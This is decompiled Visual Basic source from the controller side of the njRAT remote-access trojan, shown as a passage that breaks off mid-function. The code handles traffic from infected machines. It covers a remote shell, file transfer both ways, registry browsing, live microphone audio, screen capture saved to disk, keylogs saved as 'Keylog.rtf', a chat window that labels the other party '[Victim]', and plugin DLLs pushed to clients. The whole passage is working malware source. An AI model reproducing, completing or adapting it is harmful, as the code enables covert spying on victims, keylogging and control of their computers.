Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.My.Resources
Imports NJRAT.njRAT
Imports WinMM

Namespace NJRAT
	' Token: 0x02000045 RID: 69
	Friend NotInheritable Module Class7
		' Token: 0x0600072B RID: 1835 RVA: 0x000020D7 File Offset: 0x000002D7
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x0600072D RID: 1837 RVA: 0x00039A5C File Offset: 0x00037C5C
		Public Function smethod_0(string_2 As String, string_3 As String) As Class7.Class9
			If string_2 <> Nothing Then
				Try
					For Each [class] As Class7.Class9 In Class7.list_1
						If Operators.CompareString([class].string_0, string_2.ToLower(), False) = 0 Then
							Return [class]
						End If
					Next
				Finally
					Dim enumerator As List(Of Class7.Class9).Enumerator
					enumerator.Dispose()
				End Try
			End If
			If string_3 <> Nothing Then
				Try
					For Each class2 As Class7.Class9 In Class7.list_1
						If Operators.CompareString(class2.string_1, string_3, False) = 0 Then
							Return class2
						End If
					Next
				Finally
					Dim enumerator2 As List(Of Class7.Class9).Enumerator
					enumerator2.Dispose()
				End Try
			End If
			Return Nothing
		End Function

		' Token: 0x0600072E RID: 1838 RVA: 0x00039B20 File Offset: 0x00037D20
		Public Function smethod_1(dataGridViewRow_0 As DataGridViewRow) As Object
			Dim result As Object
			Try
				result = RuntimeHelpers.GetObjectValue(If((dataGridViewRow_0 IsNot Nothing), If((dataGridViewRow_0.Tag IsNot Nothing), Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("[", RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_0).Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_3).Value))), "/")), RuntimeHelpers.GetObjectValue(dataGridViewRow_0.Cells(Class7.int_7).Value))), "]"), "?"), "?"))
			Catch ex As Exception
				result = "?"
			End Try
			Return result
		End Function

		' Token: 0x0600072F RID: 1839 RVA: 0x00039C20 File Offset: 0x00037E20
		Public Function smethod_2(client_0 As Client, class9_0 As Class7.Class9, bool_1 As Boolean) As Boolean
			Try
				Dim text As String
				If bool_1 Then
					text = "ret" + Class7.string_1 + class9_0.string_1 + Class7.string_1
				Else
					text = String.Concat(New String() { "inv", Class7.string_1, class9_0.string_1, Class7.string_1, client_0.ip(), Class7.string_1 })
				End If
				Dim memoryStream As MemoryStream = New MemoryStream()
				memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
				If Not client_0.plg.Contains(class9_0.string_1) Then
					memoryStream.Write(class9_0.byte_0, 0, class9_0.byte_0.Length)
				Else
					memoryStream.WriteByte(40)
				End If
				client_0.Send(memoryStream.ToArray())
				Return True
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x06000730 RID: 1840 RVA: 0x00039334 File Offset: 0x00037534
		Public Function smethod_3(string_2 As String) As Form
			Return MyProject.Application.OpenForms(string_2)
		End Function

		' Token: 0x06000731 RID: 1841 RVA: 0x00039D24 File Offset: 0x00037F24
		Public Sub smethod_4(object_0 As Object)
			Dim enumerator As IEnumerator = Class7.form1_0.L1.SelectedRows.GetEnumerator()
			enumerator.Reset()
			Dim b As Byte()
			If TypeOf NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0) }, Nothing)Is String Then
				Dim text As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0) }, Nothing)))
				Dim array As Byte() = Class6.smethod_11(text)
				NewLateBinding.LateIndexSetComplex(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0), text }, Nothing, True, False)
				b = array
			Else
				b = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0) }, Nothing), Byte())
			End If
			While enumerator.MoveNext()
				Dim obj As Object = enumerator.Current
				Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
				CType(dataGridViewRow.Tag, Client).Send(b)
				Dim defaultCellStyle As DataGridViewCellStyle = dataGridViewRow.DefaultCellStyle
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing))
				Dim color As Color
				If objectValue Is Nothing Then
					Dim color2 As Color
					color = color2
				Else
					Dim obj2 As Object = objectValue
					Dim color3 As Color
					color = If((obj2 IsNot Nothing), CType(obj2, Color), color3)
				End If
				Dim foreColor As Color = color
				defaultCellStyle.ForeColor = foreColor
			End While
		End Sub

		' Token: 0x06000732 RID: 1842 RVA: 0x00039E9C File Offset: 0x0003809C
		Public Sub smethod_5(object_0 As Object)
			Dim client As Client = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(0) }, Nothing), Client)
			Dim array As Byte() = CType(NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(object_0), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte())
			Dim array2 As String() = Strings.Split(Class6.smethod_12(array), Class7.string_1, -1, CompareMethod.Binary)
			Try
				Dim left As String = array2(0)
				If Operators.CompareString(left, "Ex", False) = 0 Then
					Dim manager As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
					If manager IsNot Nothing Then
						manager.SL.Text = array2(1)
						If array2(1).StartsWith("rs:!-->") Then
							manager.shStarted = 0
						End If
					End If
				ElseIf Operators.CompareString(left, "srv", False) = 0 Then
					Dim manager2 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
					If manager2 IsNot Nothing AndAlso Operators.CompareString(array2(1), "~", False) = 0 Then
						Dim list As List(Of String) = New List(Of String)()
						Dim list2 As List(Of ListViewItem) = New List(Of ListViewItem)()
						Dim num As Integer = array2.Length - 1
						For i As Integer = 2 To num
							Dim array3 As String() = Strings.Split(array2(i), "[,]", -1, CompareMethod.Binary)
							list.Add(array3(0).ToLower())
							If manager2.LSRV.Items.ContainsKey(array3(0)) Then
								Dim listViewItem As ListViewItem = manager2.LSRV.Items(array3(0))
								listViewItem.SubItems(3).Text = array3(3)
								listViewItem.SubItems(4).Text = array3(4)
							Else
								Dim listViewItem2 As ListViewItem = New ListViewItem(array3(0))
								Dim num2 As Integer = array3.Length - 1
								For j As Integer = 1 To num2
									listViewItem2.SubItems.Add(array3(j))
								Next
								listViewItem2.Name = array3(0)
								list2.Add(listViewItem2)
								If list2.Count > 20 Then
									manager2.LSRV.Items.AddRange(list2.ToArray())
									list2.Clear()
								End If
							End If
						Next
						If list2.Count > 0 Then
							manager2.LSRV.Items.AddRange(list2.ToArray())
							list2.Clear()
						End If
						Dim list3 As List(Of String) = New List(Of String)()
						Try
							Try
								For Each obj As Object In manager2.LSRV.Items
									Dim listViewItem3 As ListViewItem = CType(obj, ListViewItem)
									If Not list.Contains(listViewItem3.Text.ToLower()) Then
										list3.Add(listViewItem3.Text)
									End If
								Next
							Finally
								Dim enumerator As IEnumerator
								If TypeOf enumerator Is IDisposable Then
									TryCast(enumerator, IDisposable).Dispose()
								End If
							End Try
						Finally
							Dim enumerator2 As IEnumerator
							If TypeOf enumerator2 Is IDisposable Then
								TryCast(enumerator2, IDisposable).Dispose()
							End If
						End Try
						Try
							For Each key As String In list3
								manager2.LSRV.Items.RemoveByKey(key)
							Next
						Finally
							Dim enumerator3 As List(Of String).Enumerator
							enumerator3.Dispose()
						End Try
						manager2.srvNxt = True
						If manager2.SrvFX Then
							manager2.SrvFX = False
							manager2.LSRV.method_3()
						End If
					End If
				Else
					If Operators.CompareString(left, "tcp", False) = 0 Then
						Dim manager3 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
						If manager3 Is Nothing Then
							Return
						End If
						Dim pr As ToolStripProgressBar = manager3.pr
						SyncLock pr
							Dim left2 As String = array2(1)
							If Operators.CompareString(left2, "~", False) = 0 Then
								Dim array4 As String() = Strings.Split(array2(2), "*", -1, CompareMethod.Binary)
								manager3.pr.Value = 0
								manager3.pr.Maximum = array4.Length
								Dim list4 As List(Of ListViewItem) = New List(Of ListViewItem)()
								Dim num3 As Integer = array4.Length - 1
								For k As Integer = 0 To num3
									Dim array5 As String() = Strings.Split(array4(k), ",", -1, CompareMethod.Binary)
									If manager3.LTCP.Items.ContainsKey(array5(0) + array5(1)) Then
										Dim listViewItem4 As ListViewItem = manager3.LTCP.Items(array5(0) + array5(1))
										listViewItem4.SubItems(4).Text = CType(Conversions.ToInteger(array5(2)), TcpState).ToString()
										Dim foreColor As Color = listViewItem4.ForeColor
										Select Case Conversions.ToInteger(array5(2))
											Case 1, 8, 9, 11, 12
												listViewItem4.ForeColor = Color.Red
											Case 4
												listViewItem4.ForeColor = Color.YellowGreen
											Case 5
												listViewItem4.ForeColor = Color.LimeGreen
										End Select
									Else
										Dim listViewItem5 As ListViewItem = New ListViewItem(array5(0).Split(New Char() { ":"c })(0))
										listViewItem5.Name = array5(0) + array5(1)
										listViewItem5.Tag = array5(0) + array5(1)
										listViewItem5.SubItems.Add(array5(0).Split(New Char() { ":"c })(1))
										listViewItem5.SubItems.Add(array5(1).Split(New Char() { ":"c })(0))
										listViewItem5.SubItems.Add(array5(1).Split(New Char() { ":"c })(1))
										listViewItem5.SubItems.Add(CType(Conversions.ToInteger(array5(2)), TcpState).ToString())
										listViewItem5.SubItems.Add(array5(3))
										Select Case Conversions.ToInteger(array5(2))
											Case 1, 8, 9, 11, 12
												listViewItem5.ForeColor = Color.Red
											Case 3, 4
												listViewItem5.ForeColor = Color.YellowGreen
											Case 5
												listViewItem5.ForeColor = Color.LimeGreen
										End Select
										list4.Add(listViewItem5)
										If list4.Count > 20 Then
											manager3.LTCP.Items.AddRange(list4.ToArray())
											list4.Clear()
											Dim columnHeader_ As ColumnHeader = manager3.LTCP.columnHeader_0
											If columnHeader_ Is Nothing Then
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(0))
											Else
												columnHeader_.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_.Tag), "-", False)), "-", "+"), "-"))
												manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(columnHeader_.Index))
											End If
										End If
									End If
								Next
								If manager3.TCPFX Then
									manager3.LTCP.method_3()
									manager3.TCPFX = False
								End If
								If list4.Count > 0 Then
									manager3.LTCP.Items.AddRange(list4.ToArray())
									list4.Clear()
									Dim columnHeader_2 As ColumnHeader = manager3.LTCP.columnHeader_0
									If columnHeader_2 Is Nothing Then
										manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(0))
									Else
										columnHeader_2.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_2.Tag), "-", False)), "-", "+"), "-"))
										manager3.LTCP.GClass9_ColumnClick(manager3.LTCP, New ColumnClickEventArgs(columnHeader_2.Index))
									End If
								End If
								manager3.TCPNXT = True
							ElseIf Operators.CompareString(left2, "RM", False) = 0 Then
								Dim num4 As Integer = array2.Length - 1
								For l As Integer = 2 To num4
									manager3.LTCP.Items.RemoveByKey(array2(l))
								Next
							ElseIf Operators.CompareString(left2, "ER", False) = 0 Then
								manager3.SL.Text = array2(2)
							End If
							GoTo IL_460F
						End SyncLock
					End If
					If Operators.CompareString(left, "MIC", False) = 0 Then
						If client.osk Is Nothing Then
							client.isPL = True
							Try
								client.osk = Class7.sk_0.GetClient(array2(1))
							Catch ex As Exception
								client.CN = False
							End Try
						End If
						If Class7.form1_0.InvokeRequired Then
							Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
						Else
							Dim mic As Mic = CType(Class7.smethod_3("mic" + client.ip()), Mic)
							Dim left3 As String = array2(2)
							If Operators.CompareString(left3, "~", False) = 0 Then
								If mic Is Nothing Then
									Dim mic2 As Mic = New Mic()
									mic2.Name = "mic" + client.ip()
									mic2.sk = client
									mic2.osk = client.osk
									Dim num5 As Integer = array2.Length - 1
									For m As Integer = 3 To num5
										mic2.ComboBox1.Items.Add(array2(m))
									Next
									mic2.Show()
								End If
							ElseIf Operators.CompareString(left3, "!", False) = 0 Then
								If mic Is Nothing Then
									client.CN = False
								Else
									Dim array6 As Byte() = CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(3) + Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte())
									If array6(0) = 31 Then
										Dim byte_ As Byte() = array6
										Dim flag As Boolean = False
										array6 = Class6.smethod_8(byte_, flag)
									End If
									mic.Text = Class6.smethod_17(CLng(array6.Length)) + " " + mic.QQ
									If Conversions.ToInteger(array2(3)) = 0 Then
										Class7.waveOut_0.Write(array6)
									Else
										Class7.waveOut_1.Write(array6)
									End If
								End If
							ElseIf Operators.CompareString(left3, "ER", False) = 0 Then
								If mic Is Nothing Then
									client.CN = False
								Else
									mic.ComboBox1.Enabled = True
									mic.ComboBox2.Enabled = True
									mic.Button1.Text = "Start"
								End If
							End If
						End If
					ElseIf Operators.CompareString(left, "get", False) = 0 Then
						client.isPL = True
						client.t.Dispose()
						client.CN = False
						client.NoPing = True
						Dim up As up = CType(Class7.smethod_3(array2(1) + array2(2)), up)
						If up Is Nothing Then
							client.Close()
						Else
							up.sk = client
							Dim num6 As Integer = 0
							client.Client.SendBufferSize = 524288
							Try
								While num6 <> up.SZ
									If up.Closinge Then
										GoTo IL_D28
									End If
									Dim array7 As Byte() = New Byte(10240) {}
									Dim num7 As Integer = up.FS.Read(array7, 0, array7.Length)
									client.Client.Client.Poll(-1, SelectMode.SelectWrite)
									client.Client.Client.Send(array7, 0, num7, SocketFlags.None)
									num6 += num7
									Class7.long_0 += CLng(num7)
									Dim progressBar As ProgressBar = up.ProgressBar1
									progressBar.Value += num7
								End While
								up.Close()
							Catch ex2 As Exception
								Try
									up.Text = "Connection lost"
									up.Lv1.ForeColor = Color.Red
								Catch ex3 As Exception
								End Try
							End Try
							IL_D28:
							client.Close()
						End If
					ElseIf Operators.CompareString(left, "post+", False) = 0 Then
						client.isPL = True
						Dim dw As DW = New DW()
						dw.FN = array2(1)
						dw.SZ = Conversions.ToInteger(array2(2))
						dw.c = client
						dw.osk = client.osk
						dw.Name = dw.osk.ip() + array2(1)
						dw.Show()
					ElseIf Operators.CompareString(left, "post", False) = 0 Then
						client.osk = Class7.sk_0.GetClient(array2(3))
						Try
							client.t.Dispose()
							client.CN = False
							client.NoPing = True
							Dim objectValue As Object = RuntimeHelpers.GetObjectValue(object_0)
							Dim array8 As Object() = New Object() { RuntimeHelpers.GetObjectValue(1), Nothing }
							Dim array9 As Object() = array8
							Dim text As String = String.Concat(New String() { "post+", Class7.string_1, array2(1), Class7.string_1, array2(2), Class7.string_1, array2(3) })
							Dim array10 As Byte() = Class6.smethod_11(text)
							array9(1) = array10
							Dim arguments As Object() = array8
							Dim obj2 As Object = Nothing
							NewLateBinding.LateIndexSet(RuntimeHelpers.GetObjectValue(objectValue), arguments, CType(obj2, String()))
							Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
							Dim num8 As Integer = 0
							While Class7.smethod_3(array2(3) + array2(1)) Is Nothing
								num8 += 1
								If num8 = 1000 Then
									Return
								End If
								Thread.Sleep(10)
							End While
							Dim client2 As Socket = client.Client.Client
							text = "ok"
							Dim buffer As Byte() = Class6.smethod_11(text)
							client2.Send(buffer, 0, 2, SocketFlags.None)
							client.Client.Client.ReceiveBufferSize = 1048576
							Class7.long_0 += 2L
							Dim dw2 As DW = CType(Class7.smethod_3(array2(3) + array2(1)), DW)
							Dim num9 As Integer = 0
							Try
								While True
									Dim array11 As Byte() = New Byte(1048576) {}
									client.Client.Client.Poll(-1, SelectMode.SelectRead)
									Dim num10 As Integer = client.Client.Client.Receive(array11, 0, array11.Length, SocketFlags.None)
									dw2.FS.Write(array11, 0, num10)
									Class7.long_1 += CLng(num10)
									num9 += num10
									Dim progressBar2 As ProgressBar = dw2.ProgressBar1
									progressBar2.Value += num10
									dw2.FS.Flush()
									If num9 = dw2.SZ Then
										Exit For
									End If
									Thread.Sleep(1)
								End While
								dw2.Button1.Enabled = False
								dw2.FS.Close()
								dw2.FS.Dispose()
								If File.Exists(dw2.folder) Then
									File.Delete(dw2.folder)
								End If
								File.Move(dw2.tmp, dw2.folder)
								dw2.Close()
							Catch ex4 As Exception
								dw2.Text = "connection lost"
								dw2.ForeColor = Color.Red
							End Try
						Catch ex5 As Exception
						End Try
						client.Close()
					Else
						If Operators.CompareString(left, "RG", False) = 0 Then
							If Class7.form1_0.InvokeRequired Then
								Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
								GoTo IL_460F
							End If
							Dim manager4 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
							Dim pr2 As ToolStripProgressBar = manager4.pr
							SyncLock pr2
								Dim left4 As String = array2(1)
								If Operators.CompareString(left4, "ER", False) = 0 Then
									manager4.RGk.Enabled = True
									manager4.RGLIST.Enabled = True
									manager4.SL.Text = Class6.smethod_16(array2(2))
								ElseIf Operators.CompareString(left4, "~", False) = 0 Then
									manager4.RGk.Enabled = True
									manager4.RGLIST.Enabled = True
									Dim nodes As TreeNodeCollection = manager4.RGk.Nodes
									Dim treeNode As TreeNode = Class6.smethod_7(array2(2), manager4.RGk.Nodes)
									Dim list5 As List(Of String) = New List(Of String)()
									If manager4.RGk.SelectedNode Is treeNode Then
										manager4.RGLIST.Items.Clear()
									End If
									Dim gclass As Manager.GClass13
									If manager4.RGCH.Contains(array2(2)) Then
										gclass = CType(manager4.RGCH(array2(2)), Manager.GClass13)
										gclass.list_0.Clear()
										gclass.list_1.Clear()
									Else
										gclass = New Manager.GClass13()
										gclass.string_0 = array2(2)
										manager4.RGCH.Add(gclass, array2(2), Nothing, Nothing)
									End If
									Dim array12 As String() = Strings.Split(array2(3), "[,]", -1, CompareMethod.Binary)
									manager4.pr.Value = 0
									manager4.pr.Maximum = array12.Length
									For Each text2 As String In array12
										If Operators.CompareString(text2, String.Empty, False) <> 0 Then
											Dim array14 As String() = Strings.Split(text2, "[;]", -1, CompareMethod.Binary)
											Try
												Dim pr3 As ToolStripProgressBar = manager4.pr
												pr3.Value += 1
												If array14.Length > 1 Then
													If manager4.RGk.SelectedNode Is treeNode Then
														Dim listViewItem6 As ListViewItem = manager4.RGLIST.Items.Add(array14(0))
														listViewItem6.SubItems.Add(array14(1))
														listViewItem6.SubItems.Add(array14(2))
														listViewItem6.ImageIndex = If((Operators.CompareString(array14(1), "String", False) <> 0), 2, 1)
													End If
													gclass.list_0.Add(array14)
												Else
													gclass.list_1.Add(array14(0))
													treeNode.Nodes.Add(array14(0), array14(0))
													If Not treeNode.Nodes.ContainsKey(array14(0)) Then
														list5.Add(array14(0))
													End If
												End If
											Catch ex6 As Exception
											End Try
										End If
									Next
									Try
										Try
											For Each obj3 As Object In treeNode.Nodes
												Dim treeNode2 As TreeNode = CType(obj3, TreeNode)
												If list5.Contains(treeNode2.Text) Then
													list5.Remove(treeNode2.Text)
												End If
											Next
										Finally
											Dim enumerator4 As IEnumerator
											If TypeOf enumerator4 Is IDisposable Then
												TryCast(enumerator4, IDisposable).Dispose()
											End If
										End Try
									Finally
										Dim enumerator5 As IEnumerator
										If TypeOf enumerator5 Is IDisposable Then
											TryCast(enumerator5, IDisposable).Dispose()
										End If
									End Try
									Try
										For Each key2 As String In list5
											treeNode.Nodes.RemoveByKey(key2)
										Next
									Finally
										Dim enumerator6 As List(Of String).Enumerator
										enumerator6.Dispose()
									End Try
									If treeNode Is manager4.RGk.SelectedNode Then
										treeNode.Expand()
									End If
									manager4.RGLIST.method_3()
									manager4.pr.Value = 0
								End If
								GoTo IL_460F
							End SyncLock
						End If
						If Operators.CompareString(left, "rss", False) = 0 Then
							Dim manager5 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
							If manager5 IsNot Nothing Then
								manager5.shStarted = 2
								manager5.T2.[ReadOnly] = False
								manager5.T2.BackColor = Color.Black
							End If
						Else
							If Operators.CompareString(left, "rs", False) = 0 Then
								Dim manager6 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
								If manager6 Is Nothing Then
									Return
								End If
								Dim t As RichTextBox = manager6.T1
								SyncLock t
									manager6.T1.SelectionStart = manager6.T1.TextLength
									manager6.T1.AppendText(Class6.smethod_16(array2(1).Replace(vbCrLf, String.Empty)) + vbCrLf)
									manager6.T1.SelectionStart = manager6.T1.TextLength
									manager6.T1.ScrollToCaret()
									GoTo IL_460F
								End SyncLock
							End If
							If Operators.CompareString(left, "rsc", False) = 0 Then
								Dim manager7 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
								If manager7 IsNot Nothing Then
									manager7.T2.[ReadOnly] = True
									manager7.T2.BackColor = Color.Gray
									manager7.shStarted = 0
								End If
							ElseIf Operators.CompareString(left, "PLG", False) = 0 Then
								Dim [class] As Class7.Class9 = Class7.smethod_0("plg.dll", Nothing)
								Dim memoryStream As MemoryStream = New MemoryStream()
								Dim text3 As String = "PLG" + Class7.string_1
								Dim array15 As Byte() = Class6.smethod_11(text3)
								memoryStream.Write(array15, 0, array15.Length)
								memoryStream.Write([class].byte_0, 0, [class].byte_0.Length)
								client.Send(memoryStream.ToArray())
							ElseIf Operators.CompareString(left, "sc~", False) = 0 Then
								If client.osk Is Nothing Then
									client.isPL = True
									Try
										client.osk = Class7.sk_0.GetClient(array2(1))
									Catch ex7 As Exception
										client.CN = False
									End Try
								End If
								If Class7.form1_0.InvokeRequired Then
									Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
								ElseIf CType(Class7.smethod_3("sc" + client.ip()), sc) Is Nothing Then
									Dim sc As sc = New sc()
									sc.osk = client.osk
									sc.sz = New Size(Conversions.ToInteger(array2(2)), Conversions.ToInteger(array2(3)))
									sc.p.Image = Nothing
									sc.Oimg = New Bitmap(sc.sz.Width, sc.sz.Height, PixelFormat.Format32bppPArgb)
									sc.sk = client
									sc.Name = "sc" + client.ip()
									sc.Show()
								End If
							Else
								If Operators.CompareString(left, "scPK", False) = 0 Then
									Dim sc2 As sc = CType(Class7.smethod_3("sc" + array2(1)), sc)
									If sc2 Is Nothing Then
										client.CN = False
										GoTo IL_460F
									End If
									Dim obj4 As sc = sc2
									SyncLock obj4
										Dim sc3 As sc = sc2
										sc3.fps += 1
										sc2.pkt = CLng(array.Length)
										If array2(2).Length = 0 Then
											Return
										End If
										Dim bitmap As Bitmap = CType(Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { RuntimeHelpers.GetObjectValue(1) }, Nothing), Byte()))), Bitmap)
										If bitmap.Width = 0 Then
											Return
										End If
										Dim array16 As String() = Strings.Split(array2(2), "-", -1, CompareMethod.Binary)
										Dim array17 As String() = Strings.Split(array16(0), ",", -1, CompareMethod.Binary)
										Dim sz As Size = New Size(Conversions.ToInteger(array17(0)), Conversions.ToInteger(array17(1)))
										Dim num11 As Integer = Conversions.ToInteger(array16(1))
										If sc2.Oimg.Size <> sz Then
											sc2.Oimg = New Bitmap(sz.Width, sz.Height, PixelFormat.Format32bppPArgb)
										End If
										Dim format As PixelFormat = PixelFormat.Format32bppArgb
										Dim num12 As Integer = 0
										Dim num13 As Integer = array16.Length - 1
										For num14 As Integer = 2 To num13
											Dim array18 As String() = Strings.Split(array16(num14), ",", -1, CompareMethod.Binary)
											Dim rect As Rectangle = New Rectangle(Conversions.ToInteger(array18(0)), Conversions.ToInteger(array18(1)), bitmap.Width, num11)
											Dim bitmapData As BitmapData = sc2.Oimg.LockBits(rect, ImageLockMode.[WriteOnly], format)
											Dim bitmap2 As Bitmap = bitmap
											Dim rect2 As Rectangle = New Rectangle(0, num12, rect.Width, rect.Height)
											Dim bitmapData2 As BitmapData = bitmap2.LockBits(rect2, ImageLockMode.[ReadOnly], format)
											Dim array19 As Byte() = New Byte(Math.Abs(bitmapData.Stride) * bitmapData.Height - 1 + 1 - 1 + 1 - 1) {}
											Class6.memcpy(bitmapData.Scan0, bitmapData2.Scan0, array19.Length)
											sc2.Oimg.UnlockBits(bitmapData)
											bitmap.UnlockBits(bitmapData2)
											num12 += num11
										Next
										sc2.p.Image = CType(sc2.Oimg.Clone(), Image)
										If Not sc2.CheckBox3.Checked Then
											Return
										End If
										Try
											sc2.Oimg.Save(sc2.Folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg)
										Catch ex8 As Exception
										End Try
										GoTo IL_460F
									End SyncLock
								End If
								If Operators.CompareString(left, "CH", False) = 0 Then
									If client.osk Is Nothing Then
										client.isPL = True
										Try
											client.osk = Class7.sk_0.GetClient(array2(1))
										Catch ex9 As Exception
											client.CN = False
										End Try
									End If
									If Class7.form1_0.InvokeRequired Then
										Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
										GoTo IL_460F
									End If
									Dim chat As Chat = CType(Class7.smethod_3("ch" + client.ip()), Chat)
									Dim left5 As String = array2(2)
									If Operators.CompareString(left5, "~", False) = 0 Then
										If chat IsNot Nothing Then
											Return
										End If
										New Chat() With { .Name = "ch" + client.ip(), .sk = client, .osk = client.osk, .T2 = { .Enabled = False }, .Button1 = { .Enabled = False } }.Show()
										GoTo IL_460F
									Else
										If Operators.CompareString(left5, "!", False) = 0 Then
											chat.T2.Enabled = True
											chat.Button1.Enabled = True
											Dim obj5 As Chat = chat
											SyncLock obj5
												chat.T1.AppendText("Connected .." & vbCrLf)
												GoTo IL_460F
											End SyncLock
										End If
										If Operators.CompareString(left5, "@", False) <> 0 Then
											Return
										End If
										Dim obj6 As Chat = chat
										SyncLock obj6
											chat.T1.SelectionStart = chat.T1.TextLength
											chat.T1.SelectionFont = New Font(chat.T1.Font, FontStyle.Bold)
											chat.T1.AppendText("[Victim] ")
											chat.T1.SelectionFont = chat.T1.Font
											chat.T1.AppendText(Class6.smethod_16(array2(3)) + vbCrLf)
											chat.T1.SelectionStart = chat.T1.TextLength
											chat.T1.ScrollToCaret()
											Try
												Interaction.AppActivate(chat.Text)
											Catch ex10 As Exception
											End Try
											GoTo IL_460F
										End SyncLock
									End If
								End If
								If Operators.CompareString(left, "kla", False) = 0 Then
									Dim kl As kl = CType(Class7.smethod_3("kl" + client.ip()), kl)
									Dim obj7 As kl = kl
									SyncLock obj7
										kl.T1.Clear()
										Dim array20 As String() = Strings.Split(Class6.smethod_16(array2(1)), vbCrLf, -1, CompareMethod.Binary)
										kl.ProgressBar1.Value = 0
										kl.ProgressBar1.Maximum = array20.Length
										For Each t2 As String In array20
											kl.insert(t2)
											Dim progressBar3 As ProgressBar = kl.ProgressBar1
											progressBar3.Value += 1
										Next
										kl.T1.ScrollToCaret()
										kl.ProgressBar1.Value = 0
										If Not Directory.Exists(client.Folder) Then
											Directory.CreateDirectory(client.Folder)
										End If
										kl.T1.SaveFile(client.Folder + "Keylog.rtf")
										GoTo IL_460F
									End SyncLock
								End If
								If Operators.CompareString(left, "kl", False) = 0 Then
									If Class7.form1_0.InvokeRequired Then
										Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0))) })
									Else
										If Class7.smethod_3("kl" + client.ip()) Is Nothing Then
											New kl() With { .c = client, .Name = "kl" + client.ip(), .Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L))) }.Show()
										End If
										Dim thread As Thread = AddressOf Class7.smethod_5
										Dim thread2 As Thread = thread
										Dim array22 As Object() = New Object(1) {}
										array22(0) = client
										Dim array23 As Object() = array22
										Dim num16 As Integer = 1
										Dim text4 As String = "kla" + Class7.string_1 + array2(1)
										array23(num16) = Class6.smethod_11(text4)
										thread2.Start(array22)
									End If
								ElseIf Operators.CompareString(left, "ret", False) = 0 Then
									If Class7.form1_0.InvokeRequired Then
